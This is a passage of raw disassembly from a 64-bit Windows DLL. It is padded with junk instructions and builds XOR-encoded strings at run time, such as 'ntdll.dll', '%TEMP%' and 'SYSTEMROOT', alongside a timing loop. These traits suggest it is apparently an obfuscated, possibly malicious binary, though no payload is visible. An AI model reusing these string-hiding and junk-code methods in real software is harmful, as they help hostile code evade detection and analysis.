   18000243b:	48 8b 1d 86 1e 02 00 	mov    0x21e86(%rip),%rbx        # 0x1800242c8
   180002442:	ff d3                	call   *%rbx
   180002444:	89 c7                	mov    %eax,%edi
   180002446:	ff d3                	call   *%rbx
   180002448:	29 f8                	sub    %edi,%eax
   18000244a:	39 f0                	cmp    %esi,%eax
   18000244c:	73 1d                	jae    0x18000246b
   18000244e:	4c 8b 35 9b 1f 02 00 	mov    0x21f9b(%rip),%r14        # 0x1800243f0
   180002455:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   18000245c:	00 00 00 00 
   180002460:	41 ff d6             	call   *%r14
   180002463:	ff d3                	call   *%rbx
   180002465:	29 f8                	sub    %edi,%eax
   180002467:	39 f0                	cmp    %esi,%eax
   180002469:	72 f5                	jb     0x180002460
   18000246b:	41 57                	push   %r15
   18000246d:	90                   	nop
   18000246e:	41 5f                	pop    %r15
   180002470:	48 83 c4 28          	add    $0x28,%rsp
   180002474:	5b                   	pop    %rbx
   180002475:	5f                   	pop    %rdi
   180002476:	5e                   	pop    %rsi
   180002477:	41 5e                	pop    %r14
   180002479:	c3                   	ret
   18000247a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180002480:	48 83 ec 58          	sub    $0x58,%rsp
   180002484:	c7 44 24 50 62 00 00 	movl   $0x62,0x50(%rsp)
   18000248b:	00 
   18000248c:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180002490:	b9 6d 02 00 00       	mov    $0x26d,%ecx
   180002495:	e8 66 f8 ff ff       	call   0x180001d00
   18000249a:	b9 0d 00 00 00       	mov    $0xd,%ecx
   18000249f:	ff 15 93 1e 02 00    	call   *0x21e93(%rip)        # 0x180024338
   1800024a5:	53                   	push   %rbx
   1800024a6:	41 56                	push   %r14
   1800024a8:	41 5e                	pop    %r14
   1800024aa:	5b                   	pop    %rbx
   1800024ab:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800024ae:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   1800024b3:	48 8d 44 24 54       	lea    0x54(%rsp),%rax
   1800024b8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800024bd:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   1800024c4:	00 
   1800024c5:	4c 8d 05 ea e5 01 00 	lea    0x1e5ea(%rip),%r8        # 0x180020ab6
   1800024cc:	31 c9                	xor    %ecx,%ecx
   1800024ce:	31 d2                	xor    %edx,%edx
   1800024d0:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1800024d6:	ff 15 4c 1f 02 00    	call   *0x21f4c(%rip)        # 0x180024428
   1800024dc:	53                   	push   %rbx
   1800024dd:	41 56                	push   %r14
   1800024df:	41 5e                	pop    %r14
   1800024e1:	5b                   	pop    %rbx
   1800024e2:	ff 15 88 1d 02 00    	call   *0x21d88(%rip)        # 0x180024270
   1800024e8:	c7 44 24 4c dd 4c a3 	movl   $0xa34cdd,0x4c(%rsp)
   1800024ef:	00 
   1800024f0:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   1800024f4:	4d 87 e4             	xchg   %r12,%r12
   1800024f7:	48 8d 00             	lea    (%rax),%rax
   1800024fa:	4d 8d 00             	lea    (%r8),%r8
   1800024fd:	48 89 d2             	mov    %rdx,%rdx
   180002500:	41 56                	push   %r14
   180002502:	41 5e                	pop    %r14
   180002504:	55                   	push   %rbp
   180002505:	4d 87 c0             	xchg   %r8,%r8
   180002508:	5d                   	pop    %rbp
   180002509:	b8 01 00 00 00       	mov    $0x1,%eax
   18000250e:	48 83 c4 58          	add    $0x58,%rsp
   180002512:	c3                   	ret
   180002513:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   18000251a:	84 00 00 00 00 00 
   180002520:	56                   	push   %rsi
   180002521:	48 81 ec 60 02 00 00 	sub    $0x260,%rsp
   180002528:	b9 8d 01 00 00       	mov    $0x18d,%ecx
   18000252d:	e8 ae f3 ff ff       	call   0x1800018e0
   180002532:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180002537:	ba 04 01 00 00       	mov    $0x104,%edx
   18000253c:	ff 15 5e 1d 02 00    	call   *0x21d5e(%rip)        # 0x1800242a0
   180002542:	55                   	push   %rbp
   180002543:	48 8d 12             	lea    (%rdx),%rdx
   180002546:	5d                   	pop    %rbp
   180002547:	4d 89 d2             	mov    %r10,%r10
   18000254a:	48 89 d2             	mov    %rdx,%rdx
   18000254d:	c7 44 24 2c 7b 00 00 	movl   $0x7b,0x2c(%rsp)
   180002554:	00 
   180002555:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002559:	83 f0 38             	xor    $0x38,%eax
   18000255c:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   180002561:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002565:	83 f0 41             	xor    $0x41,%eax
   180002568:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   18000256d:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002571:	83 f0 27             	xor    $0x27,%eax
   180002574:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   180002579:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000257d:	83 f0 2c             	xor    $0x2c,%eax
   180002580:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   180002585:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002589:	83 f0 12             	xor    $0x12,%eax
   18000258c:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   180002591:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002595:	83 f0 15             	xor    $0x15,%eax
   180002598:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   18000259d:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800025a1:	83 f0 1f             	xor    $0x1f,%eax
   1800025a4:	66 89 44 24 3c       	mov    %ax,0x3c(%rsp)
   1800025a9:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800025ad:	83 f0 14             	xor    $0x14,%eax
   1800025b0:	66 89 44 24 3e       	mov    %ax,0x3e(%rsp)
   1800025b5:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800025b9:	83 f0 0c             	xor    $0xc,%eax
   1800025bc:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   1800025c1:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800025c5:	83 f0 08             	xor    $0x8,%eax
   1800025c8:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   1800025cd:	66 c7 44 24 44 00 00 	movw   $0x0,0x44(%rsp)
   1800025d4:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1800025d9:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1800025de:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1800025e4:	ff 15 56 1c 02 00    	call   *0x21c56(%rip)        # 0x180024240
   1800025ea:	41 52                	push   %r10
   1800025ec:	41 5a                	pop    %r10
   1800025ee:	48 87 d2             	xchg   %rdx,%rdx
   1800025f1:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   1800025f5:	48 89 ff             	mov    %rdi,%rdi
   1800025f8:	e8 43 f0 ff ff       	call   0x180001640
   1800025fd:	48 8d 0d 9a e4 01 00 	lea    0x1e49a(%rip),%rcx        # 0x180020a9e
   180002604:	ff 15 46 1c 02 00    	call   *0x21c46(%rip)        # 0x180024250
   18000260a:	90                   	nop
   18000260b:	90                   	nop
   18000260c:	4d 89 e4             	mov    %r12,%r12
   18000260f:	4d 8d 12             	lea    (%r10),%r10
   180002612:	48 8b 35 87 1b 02 00 	mov    0x21b87(%rip),%rsi        # 0x1800241a0
   180002619:	ff d6                	call   *%rsi
   18000261b:	c7 44 24 50 d1 4a 74 	movl   $0x744ad1,0x50(%rsp)
   180002622:	00 
   180002623:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180002627:	4d 89 ed             	mov    %r13,%r13
   18000262a:	48 87 c9             	xchg   %rcx,%rcx
   18000262d:	4d 87 db             	xchg   %r11,%r11
   180002630:	4d 87 f6             	xchg   %r14,%r14
   180002633:	4d 89 ff             	mov    %r15,%r15
   180002636:	90                   	nop
   180002637:	90                   	nop
   180002638:	41 57                	push   %r15
   18000263a:	41 53                	push   %r11
   18000263c:	41 5b                	pop    %r11
   18000263e:	41 5f                	pop    %r15
   180002640:	e8 8b f8 ff ff       	call   0x180001ed0
   180002645:	48 8d 36             	lea    (%rsi),%rsi
   180002648:	4d 89 c9             	mov    %r9,%r9
   18000264b:	90                   	nop
   18000264c:	e8 2f ed ff ff       	call   0x180001380
   180002651:	b9 31 01 00 00       	mov    $0x131,%ecx
   180002656:	e8 b5 ef ff ff       	call   0x180001610
   18000265b:	ff 15 1f 1c 02 00    	call   *0x21c1f(%rip)        # 0x180024280
   180002661:	e8 9a f2 ff ff       	call   0x180001900
   180002666:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   18000266b:	ff 15 3f 1c 02 00    	call   *0x21c3f(%rip)        # 0x1800242b0
   180002671:	c7 44 24 50 3f c7 e8 	movl   $0xe8c73f,0x50(%rsp)
   180002678:	00 
   180002679:	8b 44 24 50          	mov    0x50(%rsp),%eax
   18000267d:	52                   	push   %rdx
   18000267e:	51                   	push   %rcx
   18000267f:	59                   	pop    %rcx
   180002680:	5a                   	pop    %rdx
   180002681:	41 53                	push   %r11
   180002683:	41 5b                	pop    %r11
   180002685:	4d 87 d2             	xchg   %r10,%r10
   180002688:	4d 87 c0             	xchg   %r8,%r8
   18000268b:	48 89 e4             	mov    %rsp,%rsp
   18000268e:	4d 8d 24 24          	lea    (%r12),%r12
   180002692:	90                   	nop
   180002693:	4d 89 f6             	mov    %r14,%r14
   180002696:	ff d6                	call   *%rsi
   180002698:	90                   	nop
   180002699:	48 81 c4 60 02 00 00 	add    $0x260,%rsp
   1800026a0:	5e                   	pop    %rsi
   1800026a1:	c3                   	ret
   1800026a2:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   1800026a9:	1f 84 00 00 00 00 00 
   1800026b0:	56                   	push   %rsi
   1800026b1:	48 81 ec 50 02 00 00 	sub    $0x250,%rsp
   1800026b8:	b9 04 03 00 00       	mov    $0x304,%ecx
   1800026bd:	e8 ae f7 ff ff       	call   0x180001e70
   1800026c2:	b9 03 00 00 00       	mov    $0x3,%ecx
   1800026c7:	ff 15 6b 1c 02 00    	call   *0x21c6b(%rip)        # 0x180024338
   1800026cd:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1800026d2:	ba 04 01 00 00       	mov    $0x104,%edx
   1800026d7:	ff 15 0b 1c 02 00    	call   *0x21c0b(%rip)        # 0x1800242e8
   1800026dd:	41 57                	push   %r15
   1800026df:	41 5f                	pop    %r15
   1800026e1:	ff 15 f1 1a 02 00    	call   *0x21af1(%rip)        # 0x1800241d8
   1800026e7:	4d 89 ff             	mov    %r15,%r15
   1800026ea:	48 87 d2             	xchg   %rdx,%rdx
   1800026ed:	4d 8d 09             	lea    (%r9),%r9
   1800026f0:	c7 44 24 2c 08 00 00 	movl   $0x8,0x2c(%rsp)
   1800026f7:	00 
   1800026f8:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800026fc:	83 f0 5f             	xor    $0x5f,%eax
   1800026ff:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   180002704:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002708:	83 f0 41             	xor    $0x41,%eax
   18000270b:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   180002710:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002714:	83 f0 46             	xor    $0x46,%eax
   180002717:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   18000271c:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002720:	83 f0 4c             	xor    $0x4c,%eax
   180002723:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   180002728:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000272c:	83 f0 41             	xor    $0x41,%eax
   18000272f:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   180002734:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002738:	83 f0 5a             	xor    $0x5a,%eax
   18000273b:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   180002740:	66 c7 44 24 3c 00 00 	movw   $0x0,0x3c(%rsp)
   180002747:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   18000274c:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   180002751:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180002757:	ff 15 ab 1a 02 00    	call   *0x21aab(%rip)        # 0x180024208
   18000275d:	4d 87 e4             	xchg   %r12,%r12
   180002760:	48 87 ed             	xchg   %rbp,%rbp
   180002763:	48 89 d2             	mov    %rdx,%rdx
   180002766:	4d 89 ed             	mov    %r13,%r13
   180002769:	4d 87 e4             	xchg   %r12,%r12
   18000276c:	48 89 db             	mov    %rbx,%rbx
   18000276f:	48 89 f6             	mov    %rsi,%rsi
   180002772:	56                   	push   %rsi
   180002773:	41 50                	push   %r8
   180002775:	41 58                	pop    %r8
   180002777:	5e                   	pop    %rsi
   180002778:	c7 44 24 40 06 20 6e 	movl   $0x6e2006,0x40(%rsp)
   18000277f:	00 
   180002780:	8b 44 24 40          	mov    0x40(%rsp),%eax
   180002784:	41 55                	push   %r13
   180002786:	41 50                	push   %r8
   180002788:	41 58                	pop    %r8
   18000278a:	41 5d                	pop    %r13
   18000278c:	b9 80 01 00 00       	mov    $0x180,%ecx
   180002791:	e8 ba f3 ff ff       	call   0x180001b50
   180002796:	ff 15 54 1a 02 00    	call   *0x21a54(%rip)        # 0x1800241f0
   18000279c:	4d 89 db             	mov    %r11,%r11
   18000279f:	48 8d 36             	lea    (%rsi),%rsi
   1800027a2:	90                   	nop
   1800027a3:	90                   	nop
   1800027a4:	90                   	nop
   1800027a5:	4d 89 f6             	mov    %r14,%r14
   1800027a8:	ff 15 7a 1a 02 00    	call   *0x21a7a(%rip)        # 0x180024228
   1800027ae:	41 57                	push   %r15
   1800027b0:	48 87 d2             	xchg   %rdx,%rdx
   1800027b3:	48 89 c0             	mov    %rax,%rax
   1800027b6:	41 5f                	pop    %r15
   1800027b8:	c7 44 24 30 13 00 00 	movl   $0x13,0x30(%rsp)
   1800027bf:	00 
   1800027c0:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800027c4:	83 f0 7d             	xor    $0x7d,%eax
   1800027c7:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   1800027cc:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800027d0:	83 f0 67             	xor    $0x67,%eax
   1800027d3:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   1800027d8:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800027dc:	83 f0 77             	xor    $0x77,%eax
   1800027df:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   1800027e4:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800027e8:	83 f0 7f             	xor    $0x7f,%eax
   1800027eb:	66 89 44 24 46       	mov    %ax,0x46(%rsp)
   1800027f0:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800027f4:	83 f0 7f             	xor    $0x7f,%eax
   1800027f7:	66 89 44 24 48       	mov    %ax,0x48(%rsp)
   1800027fc:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180002800:	83 f0 3d             	xor    $0x3d,%eax
   180002803:	66 89 44 24 4a       	mov    %ax,0x4a(%rsp)
   180002808:	8b 44 24 30          	mov    0x30(%rsp),%eax
   18000280c:	83 f0 77             	xor    $0x77,%eax
   18000280f:	66 89 44 24 4c       	mov    %ax,0x4c(%rsp)
   180002814:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180002818:	83 f0 7f             	xor    $0x7f,%eax
   18000281b:	66 89 44 24 4e       	mov    %ax,0x4e(%rsp)
   180002820:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180002824:	83 f0 7f             	xor    $0x7f,%eax
   180002827:	66 89 44 24 50       	mov    %ax,0x50(%rsp)
   18000282c:	66 c7 44 24 52 00 00 	movw   $0x0,0x52(%rsp)
   180002833:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180002838:	ff 15 22 1a 02 00    	call   *0x21a22(%rip)        # 0x180024260
   18000283e:	56                   	push   %rsi
   18000283f:	52                   	push   %rdx
   180002840:	5a                   	pop    %rdx
   180002841:	5e                   	pop    %rsi
   180002842:	55                   	push   %rbp
   180002843:	48 89 c0             	mov    %rax,%rax
   180002846:	5d                   	pop    %rbp
   180002847:	c7 44 24 40 f0 ec 66 	movl   $0x66ecf0,0x40(%rsp)
   18000284e:	00 
   18000284f:	8b 44 24 40          	mov    0x40(%rsp),%eax
   180002853:	50                   	push   %rax
   180002854:	58                   	pop    %rax
   180002855:	53                   	push   %rbx
   180002856:	4d 89 ff             	mov    %r15,%r15
   180002859:	5b                   	pop    %rbx
   18000285a:	48 89 d2             	mov    %rdx,%rdx
   18000285d:	48 87 c9             	xchg   %rcx,%rcx
   180002860:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180002864:	90                   	nop
   180002865:	48 8d 74 24 40       	lea    0x40(%rsp),%rsi
   18000286a:	48 89 f1             	mov    %rsi,%rcx
   18000286d:	ba 04 01 00 00       	mov    $0x104,%edx
   180002872:	ff 15 28 1a 02 00    	call   *0x21a28(%rip)        # 0x1800242a0
   180002878:	48 89 f1             	mov    %rsi,%rcx
   18000287b:	ff 15 8f 19 02 00    	call   *0x2198f(%rip)        # 0x180024210
   180002881:	90                   	nop
   180002882:	48 81 c4 50 02 00 00 	add    $0x250,%rsp
   180002889:	5e                   	pop    %rsi
   18000288a:	c3                   	ret
   18000288b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002890:	56                   	push   %rsi
   180002891:	57                   	push   %rdi
   180002892:	48 81 ec 58 02 00 00 	sub    $0x258,%rsp
   180002899:	b9 2d 02 00 00       	mov    $0x22d,%ecx
   18000289e:	e8 ed f3 ff ff       	call   0x180001c90
   1800028a3:	4d 87 d2             	xchg   %r10,%r10
   1800028a6:	48 89 c9             	mov    %rcx,%rcx
   1800028a9:	48 89 e4             	mov    %rsp,%rsp
   1800028ac:	ff 15 76 19 02 00    	call   *0x21976(%rip)        # 0x180024228
   1800028b2:	89 c1                	mov    %eax,%ecx
   1800028b4:	ff 15 0e 1b 02 00    	call   *0x21b0e(%rip)        # 0x1800243c8
   1800028ba:	4d 87 db             	xchg   %r11,%r11
   1800028bd:	90                   	nop
   1800028be:	4d 87 ff             	xchg   %r15,%r15
   1800028c1:	c7 44 24 2c c8 00 00 	movl   $0xc8,0x2c(%rsp)
   1800028c8:	00 
   1800028c9:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800028cd:	35 ed 00 00 00       	xor    $0xed,%eax
   1800028d2:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   1800028d7:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800028db:	35 9c 00 00 00       	xor    $0x9c,%eax
   1800028e0:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   1800028e5:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800028e9:	35 8d 00 00 00       	xor    $0x8d,%eax
   1800028ee:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   1800028f3:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800028f7:	35 85 00 00 00       	xor    $0x85,%eax
   1800028fc:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   180002901:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002905:	35 98 00 00 00       	xor    $0x98,%eax
   18000290a:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   18000290f:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002913:	35 ed 00 00 00       	xor    $0xed,%eax
   180002918:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   18000291d:	66 c7 44 24 3c 00 00 	movw   $0x0,0x3c(%rsp)
   180002924:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180002929:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   18000292e:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180002934:	ff 15 0e 18 02 00    	call   *0x2180e(%rip)        # 0x180024148
   18000293a:	90                   	nop
   18000293b:	4d 8d 12             	lea    (%r10),%r10
   18000293e:	90                   	nop
   18000293f:	4d 89 c9             	mov    %r9,%r9
   180002942:	4d 8d 24 24          	lea    (%r12),%r12
   180002946:	90                   	nop
   180002947:	e8 b4 ee ff ff       	call   0x180001800
   18000294c:	c7 44 24 50 14 a2 07 	movl   $0x7a214,0x50(%rsp)
   180002953:	00 
   180002954:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180002958:	4d 87 db             	xchg   %r11,%r11
   18000295b:	48 89 c9             	mov    %rcx,%rcx
   18000295e:	b9 cd 02 00 00       	mov    $0x2cd,%ecx
   180002963:	e8 58 f9 ff ff       	call   0x1800022c0
   180002968:	c7 44 24 30 06 00 00 	movl   $0x6,0x30(%rsp)
   18000296f:	00 
   180002970:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180002974:	83 f0 45             	xor    $0x45,%eax
   180002977:	66 89 44 24 50       	mov    %ax,0x50(%rsp)
   18000297c:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180002980:	83 f0 3c             	xor    $0x3c,%eax
   180002983:	66 89 44 24 52       	mov    %ax,0x52(%rsp)
   180002988:	8b 44 24 30          	mov    0x30(%rsp),%eax
   18000298c:	83 f0 5a             	xor    $0x5a,%eax
   18000298f:	66 89 44 24 54       	mov    %ax,0x54(%rsp)
   180002994:	66 c7 44 24 56 00 00 	movw   $0x0,0x56(%rsp)
   18000299b:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1800029a0:	ff 15 52 18 02 00    	call   *0x21852(%rip)        # 0x1800241f8
   1800029a6:	57                   	push   %rdi
   1800029a7:	41 51                	push   %r9
   1800029a9:	41 59                	pop    %r9
   1800029ab:	5f                   	pop    %rdi
   1800029ac:	41 52                	push   %r10
   1800029ae:	48 89 c9             	mov    %rcx,%rcx
   1800029b1:	41 5a                	pop    %r10
   1800029b3:	4d 87 c9             	xchg   %r9,%r9
   1800029b6:	48 8d 15 05 e1 01 00 	lea    0x1e105(%rip),%rdx        # 0x180020ac2
   1800029bd:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   1800029c2:	b9 01 00 00 00       	mov    $0x1,%ecx
   1800029c7:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1800029cd:	ff 15 c5 18 02 00    	call   *0x218c5(%rip)        # 0x180024298
   1800029d3:	41 52                	push   %r10
   1800029d5:	41 51                	push   %r9
   1800029d7:	41 59                	pop    %r9
   1800029d9:	41 5a                	pop    %r10
   1800029db:	c7 44 24 50 db cf 54 	movl   $0x54cfdb,0x50(%rsp)
   1800029e2:	00 
   1800029e3:	8b 44 24 50          	mov    0x50(%rsp),%eax
   1800029e7:	48 89 c0             	mov    %rax,%rax
   1800029ea:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   1800029ee:	41 55                	push   %r13
   1800029f0:	48 89 f6             	mov    %rsi,%rsi
   1800029f3:	48 87 ed             	xchg   %rbp,%rbp
   1800029f6:	41 5d                	pop    %r13
   1800029f8:	b9 b5 02 00 00       	mov    $0x2b5,%ecx
   1800029fd:	e8 6e f6 ff ff       	call   0x180002070
   180002a02:	48 89 c0             	mov    %rax,%rax
   180002a05:	4d 87 d2             	xchg   %r10,%r10
   180002a08:	90                   	nop
   180002a09:	48 87 f6             	xchg   %rsi,%rsi
   180002a0c:	ff 15 b6 18 02 00    	call   *0x218b6(%rip)        # 0x1800242c8
   180002a12:	89 c6                	mov    %eax,%esi
   180002a14:	48 8b 3d c5 17 02 00 	mov    0x217c5(%rip),%rdi        # 0x1800241e0
   180002a1b:	ff d7                	call   *%rdi
   180002a1d:	0f af c6             	imul   %esi,%eax
   180002a20:	89 44 24 50          	mov    %eax,0x50(%rsp)
   180002a24:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180002a28:	4d 87 ff             	xchg   %r15,%r15
   180002a2b:	4d 8d 36             	lea    (%r14),%r14
   180002a2e:	51                   	push   %rcx
   180002a2f:	4d 8d 3f             	lea    (%r15),%r15
   180002a32:	59                   	pop    %rcx
   180002a33:	e8 c8 ee ff ff       	call   0x180001900
   180002a38:	c7 44 24 2c 28 00 00 	movl   $0x28,0x2c(%rsp)
   180002a3f:	00 
   180002a40:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002a44:	83 f0 78             	xor    $0x78,%eax
   180002a47:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   180002a4c:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002a50:	83 f0 69             	xor    $0x69,%eax
   180002a53:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   180002a58:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002a5c:	83 f0 7c             	xor    $0x7c,%eax
   180002a5f:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   180002a64:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002a68:	83 f0 60             	xor    $0x60,%eax
   180002a6b:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   180002a70:	66 c7 44 24 38 00 00 	movw   $0x0,0x38(%rsp)
   180002a77:	48 8b 35 8a 17 02 00 	mov    0x2178a(%rip),%rsi        # 0x180024208
   180002a7e:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180002a83:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180002a88:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180002a8e:	ff d6                	call   *%rsi
   180002a90:	90                   	nop
   180002a91:	48 87 db             	xchg   %rbx,%rbx
   180002a94:	ff d7                	call   *%rdi
   180002a96:	4d 8d 36             	lea    (%r14),%r14
   180002a99:	c7 44 24 2c 5e 00 00 	movl   $0x5e,0x2c(%rsp)
   180002aa0:	00 
   180002aa1:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002aa5:	83 f0 0d             	xor    $0xd,%eax
   180002aa8:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   180002aad:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002ab1:	83 f0 07             	xor    $0x7,%eax
   180002ab4:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   180002ab9:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002abd:	83 f0 0d             	xor    $0xd,%eax
   180002ac0:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   180002ac5:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002ac9:	83 f0 0a             	xor    $0xa,%eax
   180002acc:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   180002ad1:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002ad5:	83 f0 1b             	xor    $0x1b,%eax
   180002ad8:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   180002add:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002ae1:	83 f0 13             	xor    $0x13,%eax
   180002ae4:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   180002ae9:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002aed:	83 f0 0c             	xor    $0xc,%eax
   180002af0:	66 89 44 24 3c       	mov    %ax,0x3c(%rsp)
   180002af5:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002af9:	83 f0 11             	xor    $0x11,%eax
   180002afc:	66 89 44 24 3e       	mov    %ax,0x3e(%rsp)
   180002b01:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002b05:	83 f0 11             	xor    $0x11,%eax
   180002b08:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   180002b0d:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002b11:	83 f0 0a             	xor    $0xa,%eax
   180002b14:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   180002b19:	66 c7 44 24 44 00 00 	movw   $0x0,0x44(%rsp)
   180002b20:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180002b25:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180002b2a:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180002b30:	ff d6                	call   *%rsi
   180002b32:	4d 89 e4             	mov    %r12,%r12
   180002b35:	4d 89 db             	mov    %r11,%r11
   180002b38:	e8 43 e8 ff ff       	call   0x180001380
   180002b3d:	4d 87 c9             	xchg   %r9,%r9
   180002b40:	48 89 e4             	mov    %rsp,%rsp
   180002b43:	c7 44 24 50 81 09 66 	movl   $0x660981,0x50(%rsp)
   180002b4a:	00 
   180002b4b:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180002b4f:	41 56                	push   %r14
   180002b51:	48 89 ed             	mov    %rbp,%rbp
   180002b54:	41 5e                	pop    %r14
   180002b56:	50                   	push   %rax
   180002b57:	58                   	pop    %rax
   180002b58:	53                   	push   %rbx
   180002b59:	48 8d 36             	lea    (%rsi),%rsi
   180002b5c:	5b                   	pop    %rbx
   180002b5d:	4d 8d 09             	lea    (%r9),%r9
   180002b60:	48 87 c9             	xchg   %rcx,%rcx
   180002b63:	48 89 d2             	mov    %rdx,%rdx
   180002b66:	4d 8d 3f             	lea    (%r15),%r15
   180002b69:	c7 44 24 50 40 00 00 	movl   $0x40,0x50(%rsp)
   180002b70:	00 
   180002b71:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
